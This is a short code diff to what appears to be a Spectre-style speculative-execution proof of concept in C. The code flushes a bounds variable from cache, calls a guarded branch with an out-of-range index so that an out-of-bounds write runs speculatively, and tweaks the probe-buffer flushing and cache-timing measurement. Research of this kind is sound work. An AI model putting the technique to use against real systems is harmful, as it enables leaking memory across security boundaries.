@@ -103,6 +103,7 @@ int __attribute__((section(".max_len"))) max_len = 43;
 
 void branch(uint64_t* array, uint64_t entry, int index){
     if (index < max_len){
+        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
         array[index] = entry;
         return;
     }
@@ -121,6 +122,7 @@ void trick_branch(){
     }
     
     _mm_clflush(&max_len);
+    flush_probe_buf_i();
 
     branch(overflow, bad_val, 49);
 }
@@ -129,7 +131,7 @@ void measure() {
     int i, j;
 
     int misses = 0;
-    uint64_t k = 1;
+    uint64_t k = 2;
     uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
